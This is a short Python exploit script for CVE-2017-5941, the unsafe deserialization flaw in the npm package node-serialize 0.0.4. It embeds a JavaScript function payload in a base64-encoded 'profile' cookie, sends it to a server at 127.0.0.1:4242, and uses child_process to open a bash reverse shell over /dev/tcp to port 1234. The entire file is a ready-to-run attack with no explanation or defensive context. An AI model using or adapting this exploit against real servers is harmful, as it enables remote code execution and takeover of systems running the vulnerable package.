#!/usr/bin/python3

# Software Link: https://www.npmjs.com/package/node-serialize
# Version: 0.0.4
# CVE: CVE-2017-5941

import requests
import base64
import sys

url = 'http://127.0.0.1:4242/'

payload = (
    "require('http').ServerResponse.prototype.end = (function (end) {"
        "return function () {"
            "['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
            "console.log('still inside');"
            "const { exec } = require('child_process');"
            "exec('bash -i >& /dev/tcp/127.0.0.1/1234 0>&1');"
        "}"
    "})(require('http').ServerResponse.prototype.end)"
)

code = "_$$ND_FUNC$$_" + payload

string = '{"username":"hasan", "exec": "' + code + '"}'
cookie = {'profile': base64.b64encode(bytes(string, 'utf-8')).decode("utf-8")}
print(cookie)
try:
    response = requests.get(url, cookies=cookie).text
    print(response)
except requests.exceptions.RequestException as e:
    print('Oops!')
    sys.exit(1)
